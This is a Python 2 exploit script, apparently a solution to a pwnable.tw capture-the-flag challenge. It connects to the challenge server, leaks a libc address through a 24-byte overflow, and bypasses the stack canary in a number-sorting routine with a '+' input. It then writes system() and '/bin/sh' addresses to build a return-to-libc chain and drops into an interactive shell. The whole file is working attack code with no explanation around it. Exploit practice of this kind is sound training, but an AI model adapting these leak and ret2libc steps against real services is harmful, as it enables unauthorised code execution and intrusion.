#! /usr/bin/python

import sys
import struct
import socket
import telnetlib

def recvuntil(s, delim):
	buf = ''
	while not buf.endswith(delim):
		buf += s.recv(1)

	return buf

def leak_libc(s):
	p  = "\x41"*(24)
	s.send(p + chr(0x0a))
	recvuntil(s, chr(0x0a))
	leak = struct.unpack("<I", recvuntil(s, ',')[:4])[0] << 8
	leak = leak & 0xffffffff
	leak = leak - 0x1b0000

	return leak

def fill_num(s):
	recvuntil(s, ':')
	s.send(str(36).encode('ascii') + chr(0x0a))

	for i in range(24):
		recvuntil(s, ': ')
		s.send(str(0).encode('ascii') + chr(0x0a))

	recvuntil(s, ': ')
	s.send('+' + chr(0x0a))

try:
	s = socket.create_connection(("chall.pwnable.tw", 10101))
except socket.gaierror as e:
	sys.exit(-1)

# discard output buffer
recvuntil(s, ':')

libc_base = leak_libc(s)
system_off = libc_base + 0x3a940
sh_off = libc_base + 0x00158e8b

print "[*] libc base: " + hex(libc_base)
print "[*] libc system: " + hex(system_off)
print "[*] /bin/sh: " + hex(sh_off)

fill_num(s)
recvuntil(s, ': ')
s.send(str(system_off).encode('ascii') + chr(0x0a))
recvuntil(s, ': ')
s.send(str(system_off).encode('ascii') + chr(0x0a))
recvuntil(s, ': ')
s.send(str(system_off).encode('ascii') + chr(0x0a))
recvuntil(s, ': ')
s.send(str(system_off).encode('ascii') + chr(0x0a))
recvuntil(s, ': ')
s.send(str(system_off).encode('ascii') + chr(0x0a))
recvuntil(s, ': ')
s.send(str(system_off).encode('ascii') + chr(0x0a))
recvuntil(s, ': ')
s.send(str(system_off).encode('ascii') + chr(0x0a))
recvuntil(s, ': ')
s.send(str(system_off).encode('ascii') + chr(0x0a))
recvuntil(s, ': ')
s.send(str(sh_off).encode('ascii') + chr(0x0a))
recvuntil(s, ': ')
s.send(str(sh_off).encode('ascii') + chr(0x0a))
recvuntil(s, ': ')
s.send(str(sh_off).encode('ascii') + chr(0x0a))

print s.recv(1024)

t = telnetlib.Telnet()
t.sock = s
t.interact()
